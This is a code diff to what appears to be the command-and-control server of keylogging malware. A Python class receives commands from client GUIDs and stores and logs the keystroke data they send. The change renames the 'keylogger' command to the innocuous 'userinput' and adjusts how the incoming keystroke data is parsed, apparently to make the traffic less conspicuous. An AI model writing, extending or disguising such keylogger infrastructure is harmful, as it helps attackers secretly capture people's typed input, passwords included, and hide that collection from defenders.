@@ -12,7 +12,7 @@ class HTTPDParser:
         self.cmds = {}
         self.cmds["register"] = self.register
 	self.cmds["ping"] = self.ping
-	self.cmds["keylogger"] = self.keylogger
+	self.cmds["userinput"] = self.keylogger
         self.config = config
 	self.output = None
         self.db = self.config.get("redis")
@@ -52,7 +52,7 @@ class HTTPDParser:
 	self.output = "pong"
 
     def keylogger(self, guid, data):
-	cmd, guid, data = data.split(" ", 2)
+	cmd, data = data.split(" ", 1)
 	Log.append_keylogger_data(guid, data)
 	Log.log_event("Keylogger", "Data received (%s)" % (guid))
 
